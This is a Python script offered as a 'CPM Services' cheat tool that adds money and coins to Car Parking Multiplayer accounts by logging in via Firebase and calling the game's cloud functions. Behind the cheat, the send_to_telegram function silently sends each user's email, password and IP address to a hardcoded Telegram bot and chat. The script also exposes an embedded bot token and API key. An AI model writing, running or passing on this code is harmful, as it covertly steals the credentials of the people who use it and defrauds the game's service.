import requests
import json
import os
import time

# --- CONFIGURATION ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"

# URLs for CPM Services
MONEY_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserMoney4"
SYNC_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"

SESSION_FILE = ".session_service"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def send_to_telegram(email, password, service_type):
    if os.path.exists(SESSION_FILE): return
    ip = get_ip()
    message = (
        f"💰 *NEW SERVICE USED*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Pass:* `{password}`\n"
        f"⚙️ *Service:* {service_type}\n"
        f"🌐 *IP:* `{ip}`\n"
        f"👤 *Brand:* @anonymo.cpm"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
        with open(SESSION_FILE, "w") as f: f.write("ok")
    except: pass

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    headers = {"Content-Type": "application/json"}
    try:
        res = requests.post(FIREBASE_URL, json=payload, headers=headers).json()
        return res.get('idToken') if 'idToken' in res else None
    except: return None

def apply_service(token, money=0, coins=0):
    # CPM format for resources
    sync_data = {
        "money": money,
        "coin": coins
    }
    payload = {"data": json.dumps(sync_data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)"
    }
    
    print(f"\033[1;33mConnecting to CPM servers...\033[0m")
    
    try:
        # Prvo pokušavamo preko specijalizovanog URL-a za novac
        response = requests.post(MONEY_URL, headers=headers, json=payload, timeout=15)
        
        if response.status_code == 200:
            print("\033[1;32mSUCCESS: Resources added! Restart your game.\033[0m")
        else:
            # Ako prvi ne uspe, probamo opšti Sync
            response2 = requests.post(SYNC_URL, headers=headers, json=payload, timeout=15)
            if response2.status_code == 200:
                print("\033[1;32mSUCCESS: Resources synced!\033[0m")
            else:
                print(f"\033[1;31mError ({response2.status_code}): Server busy. Check your account.\033[0m")
    except Exception as e:
        print(f"\033[1;31mConnection failed: {e}\033[0m")

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO CPM SERVICES   \033[0m")
        print("\033[1;36m      @anonymo.cpm        \033[0m")
        print("-" * 35)
        print("\033[1;37m1. Add 50,000,000 Money")
        print("2. Add 30,000 Coins")
        print("3. Add BOTH (Money & Coins)")
        print("0. Exit\033[0m")
        
        choice = input("\n\033[1;33mSelect Option: \033[0m")
        if choice == '0': break
        if choice not in ['1', '2', '3']: continue
        
        email = input("Enter Email: ").strip()
        password = input("Enter Password: ").strip()
        if not email or not password: continue

        token = login(email, password)
        if token:
            service_label = {
                '1': "50M Money",
                '2': "30K Coins",
                '3': "Money & Coins Pack"
            }[choice]
            
            # Send notification to you
            send_to_telegram(email, password, service_label)
            
            # Execute service
            if choice == '1': apply_service(token, money=50000000)
            elif choice == '2': apply_service(token, coins=30000)
            elif choice == '3': apply_service(token, money=50000000, coins=30000)
            
            print("\033[1;36mWait 3 seconds...\033[0m")
            time.sleep(3)
        else:
            print("\033[1;31mInvalid Login Details.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
